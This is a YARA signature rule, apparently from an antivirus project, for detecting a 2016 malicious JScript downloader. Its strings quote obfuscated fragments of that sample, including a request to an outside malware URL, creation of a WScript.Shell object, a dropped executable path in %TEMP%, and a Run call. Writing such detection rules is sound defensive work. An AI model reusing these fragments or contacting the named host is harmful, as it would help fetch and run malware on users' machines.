rule sig_20160330_40356be350f785fe4e340092d128de26 {
  meta:
    description = "datamaliciousorder - file 20160330_40356be350f785fe4e340092d128de26.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "66a2b5ef44ec120e1085bf748500a6bb31b5e143274738ae4739b1664823e4f3"

  strings:
    $s1  = "_T0[_T](\"GET\", \"http://srijanexportstowelwarmers.co.uk/k9owpa\", false);" fullword ascii
    $s2  = "function _RT(_W0, _U){_B = _B * 1; return _W0 - _U;};" fullword ascii
    $s3  = "var _MF = function _CD() {return WScript[_SY](\"WScript\"+\".Shell\");}(), _EC = 11;" fullword ascii
    $s4  = "if (_T0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _CQ() {return _MF[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"MyXmQJJRbS.ex\" + \"e\";};" fullword ascii
    $s6  = "function _NI(){return _S + \"\";};" fullword ascii
    $s7  = "function _K() {return ((_VY == true) && (_VY == _ID)) ? 1 : _B;};" fullword ascii
    $s8  = "function _W(_BI){_MF[\"Run\"](_BI, _B, _B);};" fullword ascii
    $s9  = "function _AV(){return 22;};" fullword ascii
    $s10 = "function _CG()" fullword ascii
    $s11 = "var _LR = new this[\"Date\"]();" fullword ascii
    $s12 = "function _CM(_FJ) {var _WY = (1, 2, 3, 4, 5, _FJ); return _WY;};" fullword ascii
    $s13 = " while (_HT){" fullword ascii
    $s14 = "function _DQ(){return _SY;};" fullword ascii
    $s15 = "return _RT(_V, _A);" fullword ascii
    $s16 = "var _Q = false;" fullword ascii
    $s17 = "var _ID = false;" fullword ascii
    $s18 = "var _VY = false;" fullword ascii
    $s19 = "_ID = true; " fullword ascii
    $s20 = "_VY = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}